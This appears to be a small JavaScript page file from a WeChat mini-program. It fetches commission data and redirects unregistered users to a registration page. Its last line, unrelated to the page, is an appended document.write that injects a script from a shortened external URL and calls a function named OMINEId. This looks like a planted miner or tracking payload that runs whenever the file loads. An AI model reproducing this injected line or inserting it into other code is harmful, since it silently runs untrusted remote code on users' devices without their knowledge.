var t = getApp(),
  e = t.requirejs("core");
Page({
  data: {},
  onLoad: function (t) { },
  onShow: function () {
    this.getData()
  },
  getData: function () {
    var t = this;
    e.get("commission/index", {}, function (e) {
      if (7e4 == e.error)
        return void wx.redirectTo({
          url: "/pages/commission/register/index"
        });
      e.show = true,
        t.setData(e)
    })
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
